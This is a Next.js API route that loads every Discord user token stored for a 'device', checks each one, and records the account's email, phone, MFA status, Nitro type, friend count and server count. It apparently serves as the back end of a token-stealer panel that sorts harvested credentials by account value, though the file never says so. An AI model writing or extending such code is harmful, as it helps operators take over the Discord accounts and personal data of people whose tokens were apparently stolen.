import { NextRequest, NextResponse } from "next/server"
import { getDiscordTokensByDevice } from "@/lib/db-messaging-helpers"
import { validateDiscordToken } from "@/lib/discord-validator"
import { updateDiscordTokenValidation } from "@/lib/db-messaging-helpers"

/**
 * POST /api/v1/messaging/discord/validate/[deviceId]
 * Validate all Discord tokens for a specific device
 */
export async function POST(
  request: NextRequest,
  { params }: { params: { deviceId: string } },
) {
  try {
    const { deviceId } = params

    if (!deviceId) {
      return NextResponse.json({ error: "Device ID is required" }, { status: 400 })
    }

    // Get all tokens for this device
    const tokens = await getDiscordTokensByDevice(deviceId)

    if (tokens.length === 0) {
      return NextResponse.json({
        success: true,
        message: "No Discord tokens found for this device",
        validated: 0,
      })
    }

    // Validate each token
    const results = []
    for (const tokenData of tokens) {
      console.log(`Validating Discord token for device ${deviceId}...`)

      const result = await validateDiscordToken(tokenData.token)

      // Update database with validation results
      await updateDiscordTokenValidation(deviceId, tokenData.token, {
        is_valid: result.is_valid,
        username: result.user_info?.username,
        discriminator: result.user_info?.discriminator,
        global_name: result.user_info?.global_name,
        avatar: result.user_info?.avatar,
        email: result.user_info?.email,
        phone: result.user_info?.phone,
        email_verified: result.user_info?.verified,
        mfa_enabled: result.user_info?.mfa_enabled,
        premium_type: result.user_info?.premium_type,
        account_flags: result.user_info?.flags,
        server_count: result.server_count,
        friend_count: result.friend_count,
        account_created: result.account_created_timestamp,
        bio: result.user_info?.bio,
        validation_error: result.error_message,
      })

      results.push({
        token_snippet: `${tokenData.token.substring(0, 20)}...`,
        is_valid: result.is_valid,
        username: result.user_info?.username,
        error: result.error_message,
      })

      // Rate limit protection - wait 1 second between requests
      if (tokens.length > 1) {
        await new Promise((resolve) => setTimeout(resolve, 1000))
      }
    }

    const validCount = results.filter((r) => r.is_valid).length

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      total_tokens: tokens.length,
      validated: results.length,
      valid: validCount,
      invalid: results.length - validCount,
      results,
    })
  } catch (error) {
    console.error("Error validating Discord tokens:", error)
    return NextResponse.json(
      { error: "Failed to validate Discord tokens" },
      { status: 500 },
    )
  }
}
